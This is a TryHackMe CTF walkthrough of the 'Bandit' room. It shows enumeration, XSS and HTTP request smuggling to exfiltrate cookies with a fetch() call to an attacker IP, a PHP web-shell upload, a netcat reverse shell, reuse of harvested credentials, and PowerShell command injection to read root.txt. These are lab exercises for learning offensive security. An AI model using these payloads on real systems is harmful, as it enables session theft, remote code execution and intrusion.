---
date: 2025-02-25
categories: [CTF, THM]
title: "THM - Bandit"
tags: ['command injection', 'linux', 'nmap', 'powershell', 'privilege escalation', 'python', 'rce', 'reverse shell', 'windows', 'xss']

description: "Bandit - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# THM - Bandit

- Register to start:

![image1](../resources/9649908d53a140229fc2c8889a01188d.png)

Entry point: **10.200.114.104**


![image2](../resources/1373db81ee044d5ca67bbc9d8ffde643.png)


![image3](../resources/1810b9ab7f24488397f86ba8df38ccb3.png)

- **<u>NMAP the linux host:</u>**

```bash
nmap 10.200.114.104 -A

```

![image4](../resources/a8f950d52f60456084d9f0d492aabe45.png)

- NMAP the windows host:
```bash
nmap 10.200.114.10 -p- -A -Pn

```

![image5](../resources/4435a0f2ce5546378110a9603df41cb8.png)

Add bandit.escape to /etc/hosts

- **Port 80:**

![image6](../resources/0b530bc13d6641d9aab6236c48d1eb32.png)

- Directory bruteforce:
```bash
ffuf -u http://bandit.escape/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fw 428

```

![image7](../resources/9d68b40810ef40909e884b805111e48e.png)

- Since we know there's a login.php, we can bruteforce for php extensions as well
```bash
ffuf -u http://bandit.escape/FUZZ.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fw 428

```

![image8](../resources/b1d93fe1b2094078bbcbaea68aa02312.png)

- This page is also vulnerable to XSS
```bash
"<script><script>alert('XSS');</script>

```

![image9](../resources/70ffbfa3650948578c54e0475afc307b.png)

- Let's try and get a cookie with this one:
```bash
"<script><script>alert(document.cookie)</script>

```
- Just got my own cookie again:

![image10](../resources/1fd9b15066604577934a6c51e590fa57.png)

- Looking at the NMAP scan - this server is using **Apache Traffic Server 7.1.1**

- Looking online - there is a HTTP request smuggling exploit for this version
**CVE-2018-8004**

**<u>HTTP request smuggling</u>**

- This website shows how to exploit it (4.3.1 First Patch):

[https://medium.com/@knownsec404team/protocol-layer-attack-http-request-smuggling-cc654535b6f#:~:text=4.%20HTTP%20Smuggling%20Attack%20Example%20%E2%80%94%20%E2%80%94%20CVE%2D2018%E2%80%938004](https://medium.com/@knownsec404team/protocol-layer-attack-http-request-smuggling-cc654535b6f#:~:text=4.%20HTTP%20Smuggling%20Attack%20Example%20%E2%80%94%20%E2%80%94%20CVE%2D2018%E2%80%938004)

- Firstly, turn on - Show printable characters:

![image11](../resources/c1fbc870d3224aba99e90f5e5319e462.png)

- As per the website - We need to construct a special HTTP request for smuggling:

![image12](../resources/33d81928e11540ff943d024acba4ca45.png)

- Now add something into the second request, to test if it's vulnerable:

![image13](../resources/9e31368e6cb941b182417ba3b1af83aa.png)

- **The /?filter= bit is unique to this THM room/ webserver parameter (since it's vulnerable to XSS)**

- The first GET request will be executed as normal but the second request will be smuggled

- The goal is to manipulate the front-end server (e.g., a proxy) into interpreting the request in a way that passes the XSS payload to the back-end server (e.g., Apache Tomcat), where it might be executed

- If successful, the XSS payload could be stored in the server's response and later executed when served to other users, leading to XSS attacks against unsuspecting clients

- Make sure Update content-length is **ON**:


![image14](../resources/d92651c317454f309660476e3eeb355a.png)

- If there isn't a Content-Length parameter - just send the newly crafted HTTP request and the Content-Length will update automatically

- After the HTTP request has been sent (with the Update content-length on) -
Turn **OFF** Update Content-Length:


![image15](../resources/3a68491bad9143c2bb1c2abfff36f1b1.png)

- This is the vulnerability - Create a **whitespace between Content-Length and the colon :** like so:

![image16](../resources/25c54e076dd24af59730a8c377939666.png)

- Now click Send - A couple of times (3 or 4 times):


![image17](../resources/008ab9fccd7e4a128082c8e69d7d998f.png)

- Looking at the Response body, we can see our payload made it in

- Now craft the real payload to grab a cookie:

- Go through the process again (from point 4.)

- Use the payload (and URL encode it first):
```bash
"<script><script>fetch("http://10.50.111.248:8082//"+document.cookie)</script>

```

![image18](../resources/632f0a765fd94f7da6286df9ed947af9.png)

- Set up a python server on that port

- Send the payload (click send a couple times):

![image19](../resources/b3c09bdce39f4fbd9534dea83bd98f6e.png)
- Wait for a few minutes - "until someone accesses the site"
- We got someone else's cookie

- The reason this works and the XSS didn't:
  - XSS is primarily a client-side vulnerability that involves injecting malicious scripts into web pages
  - Sending an XSS payload with HTTP request smuggling can deliver and potentially **execute XSS payloads on the server side**,
which can then affect other clients accessing the server's responses

**<u>Continuing</u>**

- In Chrome, inspect the page and go to Storage - add the new cookie in:


![image20](../resources/f83f37533af7406f8b1f49b206f0fa59.png)

- This didn't change anything on the screen (no admin panel or anything)

- Look at the previously inaccessible directories and try them to see if we have rights to access any now:

![image21](../resources/af17b3cc82f24ffc97e821b4f7d6e3c6.png)

- We can access /upload.php

- I tried to upload something but got the error:

![image22](../resources/ecbd442e6c7544a2b6f341215a5298cf.png)
- So I tried to upload the smallest file (140bytes) but still got the same error

- Looking at the page source - there is a js file that states how big the file can be:

![image23](../resources/8c058d4e45274a94905a6f22f2f3abb0.png)


![image24](../resources/017af552d685408eba997c4a3775b605.png)

- But my file is less than 500KB

- Open the /upload.php in Burp and send to repeater
- Make sure to change the cookie value:


![image25](../resources/e110397790f34bf49af1a546d789428c.png)

- Now change the text to something smaller


![image26](../resources/efa15123568a4d748ab83e22f7189c8c.png)

- The image uploaded successfully

- But navigating to:
<http://bandit.escape/uploads/shell2.php.png>

- We just see the files, saved as a .png image and the rest has been hashed into a filename

![image27](../resources/93d60867d3764c15a549c3be573b5372.png)
- Using hash-identifier we see that it's a MD5 hash:

![image28](../resources/211fe53412e040488994f1332ee7be10.png)

- Using Cyberchef - input the filename in and choose MD5 hash:

![image29](../resources/57458ae348094d41a812738b2712a13b.png)


![image30](../resources/6fce9ff609ff4f30849e9097b9f299d4.png)

- So we can see that the entire filename gets hashed

- Since the Content-Type already says image/png


![image31](../resources/ae9c96be51794194b18c1eada3490111.png)

- Give a new filename with a .php extension and see if it works

- Also add some php code - the shortest php exploit code available
```bash
<?=`$_GET[0]`?>

```

![image32](../resources/ff57dd15b271471186ee70993a63bc68.png)


![image33](../resources/3562957f391d4530a67dd0519dd720e9.png)

- Go to cyberchef again and MD5 hash that filename

![image34](../resources/c304a860e68a4d6880af8c1a30e59686.png)


![image35](../resources/d1a74a0beb2e454da9c670a1e4f63d31.png)

- Now to access the file we need to go to:
<http://bandit.escape/uploads/d97f005810ddf0a6af6468712f082ca3.php?0=id>


![image36](../resources/eaf02909f37b4a03b4dc699e8cf2d93e.png)

- This is because file got saved but it wasn't a .png so no extension got added. So we need to add .php again
- We also need to add the query parameter **?0=whatever we want** ,ie. id, hostname, cat /etc/passwd

- The way the payload \<?=\`\$\_GET\[0\]\`?\> works is:
  - **?0=id** is being passed as a query parameter in the URL
  - In the PHP code **\<?= \$\_GET\[0\] ?\>**, the **\$\_GET\[0\]** portion retrieves the value associated with the key 0 from the **\$\_GET** superglobal array
  - Because of how PHP handles query parameters, when you pass **?0=id**, PHP interprets 0 as a key in the **\$\_GET** array and id as its corresponding value
  - So, when you pass **?0=id**, the PHP code **\<?= \$\_GET\[0\] ?\>** fetches the value associated with the key 0 from the **\$\_GET** array, which is id


![image37](../resources/0068ad738bfd4b9289593a7f03d8cf2b.png)


![image38](../resources/f6b2c52174614436b5a294de5accc05d.png)

- Now we can inject a reverse shell into the query parameter (just choose the right one) and URL encode it:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.50.111.248 4445 >/tmp/f

```
- Set up nc listener:
```bash
rlwrap -cAr nc -lvnp 4445

```
- Paste it into the query parameter:

![image39](../resources/d4984035cdec4af39bc0959ba694dc8a.png)

- And shell:

![image40](../resources/e0a8421441444241ba0775e4b4b4ab24.png)

- The machine doesn't have anything to exploit like SUID or sudo

- But the shell drops us in the /app directory - the only directory that has anything in

- We can now see the auth.php file in /app/public/auth.php

![image41](../resources/cf4488e903cd41e69e1df1c94b01cfc5.png)
- And we get the credentials:
**safeadmin : HardcodedMeansUnguessableRight**

- Now we can SSH into the machine

![image42](../resources/ea238d361f5f4ba2bb53f0c5216123cf.png)

```bash
cat flag.txt

```
- We have all the power:

![image43](../resources/7353d27ea86e41faa883ea7600465dea.png)

- Since we can do anything:

![image44](../resources/c27d0e1777a84df4a47b94e3ec2d9fcc.png)

- Looking at /etc/hosts

![image45](../resources/3d4350a308444c729ef814dae5370ce7.png)

- We get an entry for the windows machine:
10.200.114.10 bandit.corp

- The Windows ports:

![image46](../resources/f072fce7beff4abf8aca8d4a6df9ea5d.png)

- Port 5985 is open - which is the Powershell remoting port
WSMan - Windows Remote Management

- Recursively try and find anything Windows related:
```bash
grep --color=auto -irnw / -e "powershell" 2>/dev/null

grep --color=auto -irnw / -e "pssession" 2>/dev/null

```
- Found a ConsoleHost_history.txt file:

![image47](../resources/f80c8719a74a46d0b302ed50713e1dde.png)


![image48](../resources/3b7289e9471948bba6f0c0b250f454a4.png)

**safeuserHelpDesk : Passw0rd**

- Run:
```bash
pwsh
```

```powershell
$ClearPassword = "Passw0rd"
$SecurePass = ConvertTo-SecureString $ClearPassword -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential("safeuserHelpDesk", $SecurePass)

Enter-PSSession -ComputerName bandit.corp `
    -Credential $credential `
    -ConfigurationName testHelpDesksafe `
    -Authentication Negotiate

```

![image49](../resources/aa5beb834be74ff48bf28533f0ff740a.png)


![image50](../resources/f012291f116f44b59c830c15502eab52.png)


![image51](../resources/f68650b246964097821408563c5b7519.png)

**<u>Bypass powershell constrained language mode:</u>**

- See what commands we have:
```bash
Get-Command

```

![image52](../resources/68050147d68a4f0981a877272d190ca6.png)

- Looks like a custom cmdlet

![image53](../resources/40dc49c295af47cd8e74dab9406f7328.png)


![image54](../resources/556c5c507aaf4b64b0aa15b6af035f68.png)

- We can use Invoke-Expression through this command

**<u>Powershell command injection:</u>**

- Trying different combinations

![image55](../resources/550af2959cae40b6b73bd88d0ebcabe7.png)

- We can parse the single quote but not the double quote

- Running whoami:
```bash
Get-ServicesApplication -Filter '$(whoami)'

```
*winrm virtual users\winrm va_2_ec2amaz-a6s61fr_safeuserhelpdesk*

- Find users:
```bash
Get-ServicesApplication -Filter '$(dir C:\Users)'

```

![image56](../resources/df48966e3dc3423e95f42477ab0bf518.png)

- Look on Administrators Desktop:
```bash
Get-ServicesApplication -Filter '$(dir C:\Users\Administrator\Desktop)'

```

![image57](../resources/a657023a7e6b47b1978c6347948c1554.png)

- Read root.txt
```bash
Get-ServicesApplication -Filter '$(type C:\Users\Administrator\Desktop\root.txt)'

```

![image58](../resources/c6df4e9d47954bf69da8cbd96ce1c3eb.png)